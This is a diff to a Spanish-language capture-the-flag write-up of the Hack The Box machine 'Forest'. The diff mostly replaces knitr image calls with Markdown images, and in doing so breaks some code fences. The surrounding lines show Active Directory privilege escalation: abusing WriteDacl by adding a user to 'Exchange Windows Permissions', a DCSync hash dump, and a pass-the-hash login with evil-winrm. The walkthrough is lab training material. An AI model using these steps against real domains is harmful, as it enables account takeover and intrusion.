@@ -229,10 +229,8 @@ ya estamos a dentro de la maquina y podemos ver la flag del usuario.
 
 Aqui hay una via potencial (un camino) que nos permitte convertir en usuario administrador
 
-```{r, echo = FALSE, fig.cap="Bloodhound privesc", out.width="90%"}
-    knitr::include_graphics("images/Forest-bloodhound.png")
-```
 ## Privilege Escalation {-}
+![Forest-bloodhoud](../assets/images/Forest-bloodhound.png) 
 
 ### Rootear la maquina {-}
 
@@ -255,10 +253,8 @@ Si hacemos un click derecho sobre el **WriteDacl** podemos mirar mas informacion
 
 ```{r, echo = FALSE, fig.cap="Bloodhound abuse WriteDacl", out.width="90%"}
     knitr::include_graphics("images/Forest-Abuse_writedacl.png")
-```
 
-1. Añadimos el grupo Exchange Windows Permissions al usuario creado
-
+![Forest-Abuse_writedacl](../assets/images/Forest-Abuse_writedacl.png) 
     ```bash
     net group
     net group "Exchange Windows Permissions" s4vitar /add
@@ -300,10 +296,8 @@ Ya tenemos el hash del usuario administrador
     knitr::include_graphics("images/Forest-dcsync-admin-hash.png")
 ```
 
-lo copiamos y con evilwin-rm nos connectamos como el usuario administrator haciendo un passthehash.
-
-```bash
 evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea6'
+![Forest-dcsyc-admi-hash](../assets/images/Forest-dcsync-admin-hash.png) 
 ```
 
 `WHOAMI -> htb\administrator` ;)
